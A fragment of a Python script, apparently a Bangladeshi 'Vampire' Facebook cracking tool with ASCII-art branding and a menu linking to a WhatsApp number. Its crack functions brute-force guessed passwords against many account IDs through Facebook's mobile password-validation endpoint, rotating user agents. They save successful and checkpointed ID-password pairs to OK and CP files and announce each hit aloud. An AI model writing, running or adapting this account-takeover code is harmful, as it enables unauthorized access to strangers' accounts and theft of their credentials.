...
#------------------[ LOGO-LAKNAT ]-----------------#
logo =""" 
\033[97;1m _    _____    __  _______  ________  ______   
\033[97;2m| |  / /   |  /  |/  / __ \/  _/ __ \/ ____/   
\033[97;3m| | / / /| | / /|_/ / /_/ // // /_/ / __/      
\033[97;4m| |/ / ___ |/ /  / / ____// // _, _/ /___      
\033[97;5m|___/_/  |_/_/  /_/_/   /___/_/ |_/_____/
╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
...
def menu():
    ...
    if TONMOY  in ['111']:
        ...
        os.system('xdg-open https://wa.me/+8801300161579')
        os.system("python nono.py")
    elif TONMOY  in ['3','03']:
        result()
    elif TONMOY  in ['0']:
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[100;92m{bo}[Tonmoy~M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;94m[Vampire-cp] {idf} • {pw}')
...
def crackfree(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r{H}[Tonmoy-M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;95m[{time.strftime("%H:%M")}•Vampire-cp] {idf} • {pw}')
                os.system('espeak -a 300 " Cp,"')
                open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                cp+=1
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•Vampire-Ok] {idf} • {pw} ')
                os.system('espeak -a 300 " Ok,  Tonmoy,  id"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
